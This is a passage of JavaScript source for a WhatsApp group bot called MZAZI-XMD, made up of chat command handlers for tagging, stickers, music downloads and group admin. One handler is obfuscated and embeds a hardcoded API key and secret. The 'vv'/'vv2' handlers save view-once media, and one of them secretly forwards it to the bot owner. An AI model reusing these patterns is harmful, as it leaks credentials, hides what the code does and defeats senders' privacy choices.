 await client.sendMessage(m.chat, { text : '𝗚𝗼𝗼𝗱𝗯𝘆𝗲 𝗲𝘃𝗲𝗿𝘆𝗼𝗻𝗲👋. 𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗶𝘀 𝗟𝗲𝗮𝘃𝗶𝗻𝗴 𝘁𝗵𝗲 𝗚𝗿𝗼𝘂𝗽 𝗻𝗼𝘄...' , mentions: participants.map(a => a.id)}, { quoted : m }); 
                 await client.groupLeave(m.chat); 
  
             } 
 break; 
     
          case "subject": case "changesubject": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
                 if (!text) throw 'Provide the text for the group subject.'; 
                 await client.groupUpdateSubject(m.chat, text); 
 m.reply('Group name successfully updated! 💀'); 
             } 
             break; 
	
           case "desc": case "setdesc": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
                 if (!text) throw 'Provide the text for the group description' 
                 await client.groupUpdateDescription(m.chat, text); 
 m.reply('Group description successfully updated! 🥶'); 
             } 
 break; 
	
     case "hidetag": case "tag": { 
             if (!m.isGroup) throw group; 
             if (!isBotAdmin) throw botAdmin; 
             if (!isAdmin) throw admin; 
            client.sendMessage(m.chat, { text : q ? q : '😅𝗕𝗹𝗶𝗻𝗱 𝗧𝗮𝗴𝘀😅' , mentions: participants.map(a => a.id)}, { quoted: m }); 
             } 
 break; 
	
      case "tagall": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 if (!isAdmin) throw admin; 
 let teks = `𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗶𝘀 𝗧𝗮𝗴𝗶𝗻𝗴 𝘆𝗼𝘂 𝗼𝗻 𝗯𝗲𝗵𝗮𝗹𝗳 𝗼𝗳 𝘆𝗼𝘂𝗿 𝗶𝗻𝗮𝗰𝘁𝗶𝘃𝗲 𝗹𝗼𝘃𝗲𝗿🖕😅: 
   
  Message ${q ? q : ''}*\n\n`; 
                 for (let mem of participants) { 
                 teks += `📧 @${mem.id.split('@')[0]}\n`; 
                 } 
                 client.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m }); 
                 } 
 break;
 
case "whatsong": case "shazam":

function _0x14eb(){const _0x17ec6c=['Audio\x20downloading\x20->','mediaType','statSync','1919133FdmqGs','quoted','name','\x0a*•\x20Artists:*\x20','Too\x20big!','4SIxIsH','error','4749610aqbgcF','code','28266SllWso','trim','join','download','msg','lengthSeconds','344WVoQkl','2353164oRynLT','unlinkSync','6799HROVVE','identify','map','pipe','\x0a*•\x20Genres:*\x20','mimetype','music','audio/mpeg','size','File\x20size\x20bigger.','audioBitrate','KKbVWlTNCL3JjxjrWnywMdvQGanyhKRN0fpQxyUo','floor','.mp3','finish','identify-eu-west-1.acrcloud.com','${title}','log','videoDetails','readFileSync','random','Analyzing\x20the\x20media...','chat','*!!','2DHsEyO','test','1200237eSXuSV','821080fmKqNk','url','Audio\x20downloaded\x20!\x20\x0a\x20Size:\x20'];_0x14eb=function(){return _0x17ec6c;};return _0x14eb();}const _0x188808=_0x4caa;function _0x4caa(_0x4f73d7,_0x4b5dfd){const _0x14eb3a=_0x14eb();return _0x4caa=function(_0x4caac0,_0x1765b7){_0x4caac0=_0x4caac0-0xf8;let _0x54195d=_0x14eb3a[_0x4caac0];return _0x54195d;},_0x4caa(_0x4f73d7,_0x4b5dfd);}(function(_0x5619b1,_0x1eb9d8){const _0x264c28=_0x4caa,_0x4e9200=_0x5619b1();while(!![]){try{const _0x14e7f0=-parseInt(_0x264c28(0x119))/0x1*(-parseInt(_0x264c28(0xfe))/0x2)+parseInt(_0x264c28(0x100))/0x3*(-parseInt(_0x264c28(0x10c))/0x4)+parseInt(_0x264c28(0x101))/0x5+-parseInt(_0x264c28(0x117))/0x6+parseInt(_0x264c28(0x110))/0x7*(parseInt(_0x264c28(0x116))/0x8)+parseInt(_0x264c28(0x107))/0x9+parseInt(_0x264c28(0x10e))/0xa;if(_0x14e7f0===_0x1eb9d8)break;else _0x4e9200['push'](_0x4e9200['shift']());}catch(_0x138fc3){_0x4e9200['push'](_0x4e9200['shift']());}}}(_0x14eb,0x3abbe));let acr=new acrcloud({'host':_0x188808(0x128),'access_key':'2631ab98e77b49509e3edcf493757300','access_secret':_0x188808(0x124)});if(!m['quoted'])throw'Tag\x20a\x20short\x20video\x20or\x20audio';let d=m['quoted']?m[_0x188808(0x108)]:m,mimes=(d['msg']||d)[_0x188808(0x11e)]||d[_0x188808(0x105)]||'';if(/video|audio/[_0x188808(0xff)](mimes)){let buffer=await d[_0x188808(0x113)]();await reply(_0x188808(0xfb));let {status,metadata}=await acr[_0x188808(0x11a)](buffer);if(status[_0x188808(0x10f)]!==0x0)throw status[_0x188808(0x114)];let {title,artists,album,genres,release_date}=metadata[_0x188808(0x11f)][0x0],txt='*•\x20Title:*\x20'+title+(artists?_0x188808(0x10a)+artists[_0x188808(0x11b)](_0x4f5d59=>_0x4f5d59[_0x188808(0x109)])[_0x188808(0x112)](',\x20'):'');const aud=_0x188808(0x129);txt+=''+(album?'\x0a*•\x20Album:*\x20'+album[_0x188808(0x109)]:'')+(genres?_0x188808(0x11d)+genres[_0x188808(0x11b)](_0xf7bf2e=>_0xf7bf2e[_0x188808(0x109)])[_0x188808(0x112)](',\x20'):'')+'\x0a',txt+='*•\x20Release\x20Date:*\x20'+release_date,await client['sendMessage'](m[_0x188808(0xfc)],{'text':txt[_0x188808(0x111)]()},{'quoted':m});const {videos}=await yts(title);if(!videos||videos['length']<=0x0){reply('No\x20Matching\x20videos\x20found\x20for\x20:\x20*'+args[0x0]+_0x188808(0xfd));return;}let urlYt1=videos[0x0][_0x188808(0x102)],infoYt1=await ytdl['getInfo'](urlYt1);if(infoYt1['videoDetails'][_0x188808(0x115)]>=0x708){reply(_0x188808(0x10b));return;}const getRandomName=_0x188f2c=>{const _0x15dc0b=_0x188808;return''+Math[_0x15dc0b(0x125)](Math[_0x15dc0b(0xfa)]()*0x2710)+_0x188f2c;};let titleYt1=infoYt1[_0x188808(0xf8)]['title'],randomNam=getRandomName('.mp3');const stream=ytdl(urlYt1,{'filter':_0x5ac95f=>_0x5ac95f['audioBitrate']==0xa0||_0x5ac95f[_0x188808(0x123)]==0x80})[_0x188808(0x11c)](fs['createWriteStream']('./'+randomNam));console[_0x188808(0x12a)](_0x188808(0x104),urlYt1),await new Promise((_0x1cc1a5,_0x4efba3)=>{const _0x426073=_0x188808;stream['on'](_0x426073(0x10d),_0x4efba3),stream['on'](_0x426073(0x127),_0x1cc1a5);});let stats=fs[_0x188808(0x106)]('./'+randomNam),fileSizeInBytes=stats[_0x188808(0x121)],fileSizeInMegabytes=fileSizeInBytes/(0x400*0x400);console[_0x188808(0x12a)](_0x188808(0x103)+fileSizeInMegabytes),fileSizeInMegabytes<=0x28?await client['sendMessage'](from,{'document':fs[_0x188808(0xf9)]('./'+randomNam),'mimetype':_0x188808(0x120),'fileName':titleYt1+_0x188808(0x126)},{'quoted':m}):reply(_0x188808(0x122)),fs[_0x188808(0x118)]('./'+randomNam);}
    
	break; 
		      
	
 


      // Other commands

        case "s": case "sticker": 
{
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

if(!msgDreaded) { m.reply('Quote an image or a short video.') ; return } ;
let media;
if (msgDreaded.imageMessage) {
     media = msgDreaded.imageMessage
  } else if(msgDreaded.videoMessage) {
media = msgDreaded.videoMessage
  } 
 else {
    m.reply('That is neither an image nor a short video! '); return
  } ;

var result = await client.downloadAndSaveMediaMessage(media);

let stickerResult = new Sticker(result, {
            pack: packname,
            author: author,
            type: StickerTypes.FULL,
            categories: ["🤩", "🎉"],
            id: "12345",
            quality: 70,
            background: "transparent",
          });
const Buffer = await stickerResult.toBuffer();
          client.sendMessage(m.chat, { sticker: Buffer }, { quoted: m });

}
break;
	
          case "dp": { 
 try { 
 ha = m.quoted.sender; 
 qd = await client.getName(ha); 
 pp2 = await client.profilePictureUrl(ha,'image'); 
 } catch {  
 pp2 = 'https://tinyurl.com/yx93l6da'; 
 } 
  if (!m.quoted) throw `Tag a user!`; 
 bar = `Profile Picture of ${qd}`; 
 client.sendMessage(m.chat, { image: { url: pp2}, caption: bar, fileLength: "999999999999"}, { quoted: m}); 
 } 
 break;

case "list": case "vars": case "help":
let vaa = `𝟏 Owner➣ 𝐆𝐞𝐭 𝗠𝘇𝗮𝘇𝗶  𝐜𝐨𝐧𝐭𝐚𝐜𝐭\n\n𝟐 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭➣ 𝐒𝐞𝐧𝐝𝐬 𝐦𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐚𝐥𝐥 𝐠𝐫𝐨𝐮𝐩𝐬\n\n𝟑 𝐉𝐨𝐢𝐧➣ 𝐭𝐚𝐠 𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤 𝐰𝐢𝐭𝐡 𝐣𝐨𝐢𝐧\n\n𝟒 𝐛𝐨𝐭𝐩𝐩➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐛𝐨𝐭𝐬 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐝𝐩\n\n𝟓 𝐁𝐥𝐨𝐜𝐤➣ 𝐁𝐥𝐨𝐜𝐤 𝐭𝐡𝐞𝐦 𝐟𝐚𝐤𝐞 𝐟𝐫𝐢𝐞𝐧𝐝𝐬\n\n𝟔 𝐊𝐢𝐥𝐥➣ 𝐊𝐢𝐥𝐥𝐬 𝐠𝐫𝐨𝐮𝐩 𝐢𝐧 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n𝟕 𝐔𝐧𝐛𝐥𝐨𝐜𝐤➣ 𝐆𝐢𝐯𝐞 𝐭𝐡𝐞𝐦 𝐟𝐚𝐤𝐞 𝐟𝐫𝐢𝐞𝐧𝐝𝐬 𝐚 𝐬𝐞𝐜𝐨𝐧𝐝 𝐜𝐡𝐚𝐧𝐜𝐞\n\n𝟖 𝐒𝐞𝐭𝐯𝐚𝐫➣ 𝐒𝐞𝐭 𝐯𝐚𝐫𝐬 𝐢𝐧 𝐡𝐞𝐫𝐨𝐤𝐮\n\n𝟗 𝐒𝐭𝐢𝐜𝐤𝐞𝐫➣ 𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐬 𝐚 𝐩𝐡𝐨𝐭𝐨 𝐨𝐫 𝐚 𝐬𝐡𝐨𝐫𝐭 𝐯𝐢𝐝𝐞𝐨 𝐭𝐨 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫\n\n𝟏𝟎 𝐓𝐨𝐢𝐦𝐠➣ 𝐂𝐨𝐧𝐯𝐞𝐫𝐭𝐬 𝐚 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨\n\n𝟏𝟏 𝐏𝐥𝐚𝐲➣ 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐟𝐚𝐯𝐨𝐫𝐢𝐭𝐞 𝐬𝐨𝐧𝐠\n\n𝟏𝟐 𝐖𝐡𝐚𝐭𝐬𝐨𝐧𝐠➣ 𝐠𝐞𝐭 𝐭𝐡𝐞 𝐭𝐢𝐭𝐥𝐞 𝐨𝐟 𝐭𝐡𝐞 𝐬𝐨𝐧𝐠\n\n𝟏𝟑 𝐘𝐭𝐬 ➣ 𝐆𝐞𝐭 𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𝐯𝐢𝐝𝐞𝐨𝐬\n\n𝟏𝟒 𝐌𝐨𝐯𝐢𝐞➣ 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐟𝐚𝐯𝐨𝐫𝐢𝐭𝐞 𝐦𝐨𝐯𝐢𝐞 𝐝𝐞𝐭𝐚𝐢𝐥𝐬\n\n𝟏𝟓 𝐌𝐢𝐱➣ 𝐂𝐨𝐦𝐛𝐢𝐧𝐞𝐬 +𝟐𝐞𝐦𝐨𝐣𝐢𝐬\n\n𝟏𝟔 𝐀𝐢-𝐢𝐦𝐠➣ 𝐆𝐞𝐭 𝐚𝐧 𝐀𝐢 𝐩𝐡𝐨𝐭𝐨\n\n𝟏𝟕 𝐆𝐩𝐭 ➣ 𝐇𝐞𝐫𝐞 𝐭𝐨 𝐚𝐧𝐬𝐰𝐞𝐫 𝐲𝐨𝐮𝐫 𝐪𝐮𝐞𝐬𝐭𝐢𝐨𝐧𝐬\n\n𝟏𝟖 𝐃𝐩➣ 𝐆𝐞𝐭𝐬 𝐚 𝐩𝐞𝐫𝐬𝐨𝐧 𝐝𝐩\n\n𝟏𝟗 𝐒𝐩𝐞𝐞𝐝 ➣ 𝐂𝐡𝐞𝐜𝐤𝐬 𝐛𝐨𝐭𝐬 𝐬𝐩𝐞𝐞𝐝\n\n𝟐𝟎 𝐀𝐥𝐢𝐯𝐞➣ 𝐂𝐡𝐞𝐜𝐤 𝐰𝐡𝐞𝐭𝐡𝐞𝐫 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐢𝐬 𝐬𝐭𝐢𝐥𝐥 𝐤𝐢𝐜𝐤𝐢𝐧𝐠\n\n𝟐𝟏 𝐑𝐮𝐧𝐭𝐢𝐦𝐞➣ 𝐖𝐡𝐞𝐧 𝐝𝐢𝐝 𝐛𝐨𝐭 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐧𝐠\n\n𝟐𝟐 𝐒𝐜𝐫𝐢𝐩𝐭➣ 𝐆𝐞𝐭 𝐛𝐨𝐭 𝐬𝐜𝐫𝐢𝐩𝐭\n\n𝟐𝟑 𝐎𝐰𝐧𝐞𝐫  ➣ 𝐆𝐞𝐭 𝐨𝐰𝐧𝐞𝐫(𝐬) 𝐜𝐨𝐧𝐭𝐚𝐜𝐭\n\n𝟐𝟒 𝐕𝐚𝐫𝐬 ➣ 𝐒𝐞𝐞 𝐚𝐥𝐥 𝐯𝐚𝐫𝐢𝐚𝐛𝐥𝐞𝐬\n\n𝟐𝟓 𝐏𝐫𝐨𝐦𝐨𝐭𝐞➣ 𝐆𝐢𝐯𝐞𝐬 𝐨𝐧𝐞 𝐚𝐝𝐦𝐢𝐧 𝐫𝐨𝐥𝐞\n\n𝟐𝟔 𝐃𝐞𝐦𝐨𝐭𝐞➣ 𝐃𝐞𝐦𝐨𝐭𝐞𝐬 𝐟𝐫𝐨𝐦 𝐠𝐫𝐨𝐮𝐩 𝐚𝐝𝐦𝐢𝐧 𝐭𝐨 𝐚 𝐦𝐞𝐦𝐛𝐞𝐫\n\n𝟐𝟕 𝐃𝐞𝐥𝐞𝐭𝐞➣ 𝐃𝐞𝐥𝐞𝐭𝐞 𝐚 𝐦𝐞𝐬𝐬𝐚𝐠𝐞\n\n𝟐𝟖 𝐑𝐞𝐦𝐨𝐯𝐞/𝐤𝐢𝐜𝐤➣ 𝐊𝐢𝐜𝐤 𝐭𝐡𝐚𝐭 𝐭𝐞𝐫𝐫𝐨𝐫𝐢𝐬𝐭 𝐟𝐫𝐨𝐦 𝐚 𝐠𝐫𝐨𝐮𝐩\n\n𝟐𝟗 𝐅𝐨𝐫𝐞𝐢𝐠𝐧𝐞𝐫𝐬➣ 𝐆𝐞𝐭 𝐟𝐨𝐫𝐞𝐢𝐠𝐧 𝐧𝐮𝐦𝐛𝐞𝐫𝐬\n\n𝟑𝟎 𝐂𝐥𝐨𝐬𝐞➣ 𝐓𝐢𝐦𝐞 𝐟𝐨𝐫 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐦𝐛𝐞𝐫𝐬 𝐭𝐨 𝐭𝐚𝐤𝐞 𝐚 𝐛𝐫𝐞𝐚𝐤 𝐨𝐧𝐥𝐲 𝐚𝐝𝐦𝐢𝐧𝐬 𝐜𝐚𝐧 𝐜𝐡𝐚𝐭\n\n𝟑𝟏 𝐎𝐩𝐞𝐧 ➣ 𝐄𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐜𝐚𝐧 𝐜𝐡𝐚𝐭 𝐢𝐧 𝐚 𝐠𝐫𝐨𝐮𝐩\n\n𝟑𝟐 𝐈𝐜𝐨𝐧➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐠𝐫𝐨𝐮𝐩 𝐢𝐜𝐨𝐧\n\n𝟑𝟑 𝐒𝐮𝐛𝐣𝐞𝐜𝐭➣ 𝐂𝐡𝐚𝐧𝐠𝐞 𝐠𝐫𝐨𝐮𝐩 𝐬𝐮𝐛𝐣𝐞𝐜𝐭\n\n𝟑𝟒 𝐃𝐞𝐬𝐜➣ 𝐆𝐞𝐭 𝐠𝐫𝐨𝐮𝐩 𝐝𝐞𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧\n\n𝟑𝟓 𝐋𝐞𝐚𝐯𝐞➣ 𝐓𝐡𝐞 𝐠𝐫𝐨𝐮𝐩 𝐢𝐬 𝐛𝐨𝐫𝐢𝐧𝐠 ,𝐭𝐢𝐦𝐞 𝐟𝐨𝐫 𝐛𝐨𝐭 𝐭𝐨 𝐥𝐞𝐚𝐯𝐞\n\n𝟑𝟔 𝐓𝐚𝐠𝐚𝐥𝐥 ➣ 𝐓𝐚𝐠 𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐢𝐧 𝐚 𝐠𝐫𝐨𝐮𝐩 𝐜𝐡𝐚𝐭\n\n𝟑𝟕 𝐇𝐢𝐝𝐞𝐭𝐚𝐠➣ 𝐀𝐭𝐭𝐞𝐧𝐭𝐢𝐨𝐧! 𝐀𝐭𝐭𝐞𝐧𝐭𝐢𝐨𝐧! 𝐬𝐨𝐦𝐞𝐨𝐧𝐞 𝐡𝐚𝐬 𝐬𝐨𝐦𝐞𝐭𝐡𝐢𝐧𝐠 𝐭𝐨 𝐬𝐚𝐲\n\n𝟑𝟖 𝐑𝐞𝐯𝐨𝐤𝐞 ➣ 𝐑𝐞𝐬𝐞𝐭 𝐠𝐫𝐨𝐮𝐩 𝐥𝐢𝐧𝐤`
reply(vaa)
break;

  case "vv": case "retrieve":{

if (!m.quoted) return m.reply("quote a viewonce message eh")

  const quotedMessage = m.msg?.contextInfo?.quotedMessage;

    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      client.sendMessage(m.chat, { image: { url: imageUrl }, caption: `Retrieved by MZAZI-XMD!\n${imageCaption}`}, { quoted: m });
    }

    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      client.sendMessage(m.chat, { video: { url: videoUrl }, caption: `Retrieved by MZAZI-XMD!\n${videoCaption}`}, { quoted: m });
    }

      }
	break;
	
	 case "vv2": case "wah":{

if (!m.quoted) return m.reply("quote a viewonce message eh")

  const quotedMessage = m.msg?.contextInfo?.quotedMessage;

    if (quotedMessage.imageMessage) {
      let imageCaption = quotedMessage.imageMessage.caption;
      let imageUrl = await client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
      client.sendMessage(client.user.id, { image: { url: imageUrl }, caption: `Retrieved by MZAZI-XMD!\n${imageCaption}`}, { quoted: m });
    }

    if (quotedMessage.videoMessage) {
      let videoCaption = quotedMessage.videoMessage.caption;
      let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
      client.sendMessage(client.user.id, { video: { url: videoUrl }, caption: `Retrieved by MZAZI-XMD!\n${videoCaption}`}, { quoted: m });
    }

      }
	break;
		      
    case 'take': {
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

if(!msgDreaded) { m.reply('Quote an image, a short video or a sticker to change watermark.') ; return } ;


let media;
if (msgDreaded.imageMessage) {
     media = msgDreaded.imageMessage
  } else if(msgDreaded.videoMessage) {
media = msgDreaded.videoMessage
  } 
  else if (msgDreaded.stickerMessage) {
    media = msgDreaded.stickerMessage ;
  } else {
    m.reply('This is neither a sticker, image nor a video...'); return
  } ;

var result = await client.downloadAndSaveMediaMessage(media);

let stickerResult = new Sticker(result, {
            pack: pushname,
            author: pushname,
            type: StickerTypes.FULL,
            categories: ["🤩", "🎉"],
            id: "12345",
            quality: 70,
            background: "transparent",
          });
const Buffer = await stickerResult.toBuffer();
          client.sendMessage(m.chat, { sticker: Buffer }, { quoted: m });

}
break;
 
	      case "song2": {
		     const ytSearch = require('yt-search');
const fetch = require('node-fetch');

  // Function to attempt download from API
  const getDownloadData = async (apiUrl) => {
    const response = await fetch(apiUrl);
    return response.json();
  };

  try {
    // Check if query is provided
    if (!text || text.trim().length === 0) {
      return m.reply('What song do you want to download ?');
    }

    // Perform a YouTube search based on the query
    const searchResults = await ytSearch(text);

    // Check if any videos were found
    if (!searchResults || !searchResults.videos.length) {
      return message.reply('No video found for the specified query.');
    }

    const firstVideo = searchResults.videos[0];
    const videoUrl = firstVideo.url;
	  m.reply(`_Please wait your download on progress..._`)

    // Attempt to download from different APIs
    let downloadData;
    let downloadUrl;
    let videoDetails;

    // Try Gifted API
    downloadData = await getDownloadData(`https://xploader-api.vercel.app/ytmp3?url=${encodeURIComponent(videoUrl)}`);
    if (downloadData.success) {
      downloadUrl = downloadData.result.download_url;
      videoDetails = downloadData.result;
    } else {
      // Try Yasiya API if Gifted fails
      downloadData = await getDownloadData(`https://api.ryzendesu.vip/api/downloader/ytmp3?url=${encodeURIComponent(videoUrl)}`);
      if (downloadData.success) {
        downloadUrl = downloadData.result.download_url;
        videoDetails = downloadData.result;
      } else {
        // Try Dreaded API if both fail
        downloadData = await getDownloadData(`https://api.dreaded.site/api/ytdl/audio?url=${encodeURIComponent(videoUrl)}`);
        if (downloadData.success) {
          downloadUrl = downloadData.result.download_url;
          videoDetails = downloadData.result;
        }
      }
    }

    // Check if a valid download URL was found
    if (!downloadUrl || !videoDetails) {
      return m.reply('Failed to retrieve download URL from all sources. Please try again later.');
    }

    // Prepare the message payload with external ad details
    const messagePayload = {
      audio: { url: downloadUrl },
      mimetype: 'audio/mp4',
      fileName: `${videoDetails.title}.mp3`
        };

    // Send the download link to the user
    await client.sendMessage(m.chat, messagePayload, { quoted: m });

  } catch (error) {
    console.error('Error during download process:', error);
    return m.reply(`Download failed due to an error: ${error.message || error}`);
  }
      }
	   break;

case 'ytsearch':
    case 'yts': {
        if (!text) {
            reply('Provide a search term!\E.g: Alan walker alone')
            return;
        }
        const term = text;
        const {
            videos
        } = await yts(term);
        if (!videos || videos.length <= 0) {
            reply(`No Matching videos found for : *${term}*!!`)
            return;
        }
        const length = videos.length < 10 ? videos.length : 10;
        let tex = `YouTube Search\n🔍 Query ~> ${term}\n\n`;
        for (let i = 0; i < length; i++) {
            tex += `Link ~> ${videos[i].url}\nChannel ~> ${videos[i].author.name}\nTitle ~> ${videos[i].title}\n\n`;
        }
        reply(tex)
        return;
    }
    break;

case "ytmp3": case "yta": {
const ytSearch = require("yt-search");
const fetch = require('node-fetch');
try {

if (!text) return m.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 𝗹𝗶𝗻𝗸!")

	let urls = text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return m.reply('𝗧𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗬𝗼𝘂𝘁𝘂𝗯𝗲 𝗟𝗶𝗻𝗸');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length)
		return m.reply('𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗟𝗶𝗻𝗸.');

        const { videos } = await yts(text);
        if (!videos || videos.length === 0) return m.reply("No songs found!");

        const urlYt = videos[0].url;
        let data = await fetchJson(`https://api.dreaded.site/api/ytdl/audio?url=${urlYt}`);

        if (!data || !data.result || !data.result.url) {
            return m.reply("Failed to fetch audio from the API.");
        }

        const audioUrl = data.result.url;
const title = data.result.title;


        await client.sendMessage(
            m.chat,
            {
                audio: { url: audioUrl },
                mimetype: "audio/mpeg",
                fileName: `${title}.mp3`,
            },
            { quoted: m }
        );
    } catch (error) {
        m.reply("Download failed\n" + error.message);
    }
}
  break;
  
case 'ytmp4':
case "ytv": {
	try {

if (!text) return m.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗹𝗶𝗻𝗸!")

        let urls = text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
        if (!urls) return m.reply('𝗧𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗹𝗶𝗻𝗸');
        let urlIndex = parseInt(text) - 1;
        if (urlIndex < 0 || urlIndex >= urls.length)
                return m.reply('𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗹𝗶𝗻𝗸.');

        const { videos } = await yts(text);
        if (!videos || videos.length === 0) return m.reply("No songs found!");

        const urlYt = videos[0].url;
        let data = await fetchJson(`https://api.dreaded.site/api/ytdl/video?url=${urlYt}`);

        if (!data || !data.result || !data.result.url) {
            return m.reply("Failed to fetch video from the API.");
        }

        const audioUrl = data.result.url;
const title = data.result.title;


        await client.sendMessage(
            m.chat,
            {
                video: { url: audioUrl },
                mimetype: "video/mpeg",
                fileName: `${title}.mp4`,
            },
            { quoted: m }
        );
    } catch (error) {
        m.reply("Download failed\n" + error.message);
    }
}
        
break;
    
    case "ping": case "speed": {
                 
	    await loading ()
	     m.reply (`𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗦𝗣𝗘𝗘𝗗\n ${dreadedspeed.toFixed(4)} 𝗠𝘀`); 
         } 
 break; 
  
  case "uptime": { 
                 m.reply (`${runtime(process.uptime())}`) 
 } 
 break;
		
	case 'runtime':
		let mzazi = `𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝘂𝗻𝗻𝗶𝗻𝗴 𝘀𝗶𝗻𝗰𝗲 ${runtime(process.uptime())}`
                client.sendMessage(m.chat, {
                    text: mzazi,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: '𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗',
                            body: 'https://chat.whatsapp.com/DefN96lXQ4i5iO1wDDeu2C',
                            thumbnailUrl: 'https://i.imgur.com/A08nrWx.jpeg',
                            sourceUrl: 'https://chat.whatsapp.com/DefN96lXQ4i5iO1wDDeu2C',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break;

  case "apk":
      case "app":{
          if (!text) return reply("Where is the app name?");
        let kyuu = await fetchJson (`https://bk9.fun/search/apk?q=${text}`);
        let tylor = await fetchJson (`https://bk9.fun/download/apk?id=${kyuu.BK9[0].id}`);
         await client.sendMessage(
              m.chat,
              {
                document: { url: tylor.BK9.dllink },
                fileName: tylor.BK9.name,
                mimetype: "application/vnd.android.package-archive",
                contextInfo: {
        externalAdReply: {
          title: `𝗠𝗭𝗔𝗭𝗜-𝗫𝗠𝗗`,
          body: `${tylor.BK9.name}`,
          thumbnailUrl: `${tylor.BK9.icon}`,
          sourceUrl: `${tylor.BK9.dllink}`,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
          }
      break;

          case "mix": {
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

const axios = require("axios");
if (!text) return m.reply("No emojis provided ? ")


  const emojis = text.split('+');

  if (emojis.length !== 2) {
    m.reply("Specify the emojis and separate with '+'");
    return;
  }

  const emoji1 = emojis[0].trim();
  const emoji2 = emojis[1].trim();

  try {
    const axios = require('axios');
    const response = await axios.get(`https://levanter.onrender.com/emix?q=${emoji1}${emoji2}`);

    if (response.data.status === true) {
    

      let stickerMess = new Sticker(response.data.result, {
        pack: botname,
        type: StickerTypes.CROPPED,
        categories: ["🤩", "🎉"],
        id: "12345",
        quality: 70,
        background: "transparent",
      });
      const stickerBuffer2 = await stickerMess.toBuffer();
      client.sendMessage(m.chat, { sticker: stickerBuffer2 }, { quoted: m });

    } else {
      m.reply("Unable to create emoji mix.");
    }
  } catch (error) {
    m.reply("An error occurred while creating the emoji mix." + error );
  }
      }
	  break;
	
          case "lyrics": {
		      const fetch = require('node-fetch');
 const apiUrl = `https://api.dreaded.site/api/lyrics?title=${encodeURIComponent(text)}`;

    try {
        if (!text) return m.reply("Provide a song name!");

        const data = await fetchJson(apiUrl);

        if (!data.success || !data.result || !data.result.lyrics) {
            return m.reply(`Sorry, I couldn't find any lyrics for "${text}".`);
        }

        const { title, artist, link, thumb, lyrics } = data.result;

        const imageUrl = thumb || "https://i.imgur.com/x8scmqS.jpeg";

        const imageBuffer = await fetch(imageUrl)
            .then(res => res.buffer())
            .catch(err => {
                console.error('Error fetching image:', err);
                return null;
            });

        if (!imageBuffer) {
            return m.reply("An error occurred while fetching the image.");
        }

        const caption = `**Title**: ${title}\n**Artist**: ${artist}\n\n${lyrics}`;

        await client.sendMessage(
            m.chat,
            {
